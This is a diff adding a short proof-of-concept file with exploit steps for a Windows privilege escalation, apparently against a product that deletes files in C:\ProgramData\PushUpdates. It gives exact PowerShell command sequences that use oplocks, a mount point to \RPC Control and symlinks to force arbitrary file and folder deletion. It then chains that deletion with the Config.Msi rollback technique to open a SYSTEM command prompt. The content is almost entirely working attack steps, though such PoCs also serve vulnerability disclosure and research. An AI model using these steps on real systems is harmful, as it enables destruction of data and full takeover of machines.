@@ -1,0 +1,15 @@
+Arbitrary file deletion:
+
+1. mkdir C:\ProgramData\PushUpdates; echo aaa > C:\ProgramData\PushUpdates\aaa.txt; echo bbb > C:\ProgramData\PushUpdates\bbb.txt; .\SetOpLock.exe C:\ProgramData\logs\log.txt
+2. Remove-Item -Path C:\ProgramData\PushUpdates -Recurse; mkdir C:\ProgramData\PushUpdates; .\CreateMountPoint.exe C:\ProgramData\PushUpdates "\RPC Control"; .\CreateSymlink.exe "C:\ProgramData\PushUpdates\bbb.txt" 'C:\ProgramData\target.txt'
+
+Arbitrary folder deletion:
+
+1. mkdir C:\ProgramData\PushUpdates; echo aaa > C:\ProgramData\PushUpdates\aaa.txt; echo bbb > C:\ProgramData\PushUpdates\bbb.txt; .\SetOpLock.exe C:\ProgramData\logs\log.txt
+2. Remove-Item -Path C:\ProgramData\PushUpdates -Recurse; mkdir C:\ProgramData\PushUpdates; .\CreateMountPoint.exe C:\ProgramData\PushUpdates "\RPC Control"; .\CreateSymlink.exe "C:\ProgramData\PushUpdates\bbb.txt" 'C:\ProgramData\target_folder::$INDEX_ALLOCATION'
+
+Arbitrary file/folder deletion to SYSTEM Command Prompt:
+
+1. Run FolderOrFileDeleteToSystem.exe (https://github.com/thezdi/PoC/tree/master/FilesystemEoPs) with SystemCmdLauncher.dll, Msi_Rollback.msi, and 5eeabb3.rbs in the same directory
+2. mkdir C:\ProgramData\PushUpdates; echo aaa > C:\ProgramData\PushUpdates\aaa.txt; echo bbb > C:\ProgramData\PushUpdates\bbb.txt; .\SetOpLock.exe C:\ProgramData\logs\log.txt
+3. Remove-Item -Path C:\ProgramData\PushUpdates -Recurse; mkdir C:\ProgramData\PushUpdates; .\CreateMountPoint.exe C:\ProgramData\PushUpdates "\RPC Control"; .\CreateSymlink.exe "C:\ProgramData\PushUpdates\bbb.txt" 'C:\Config.Msi::$INDEX_ALLOCATION'
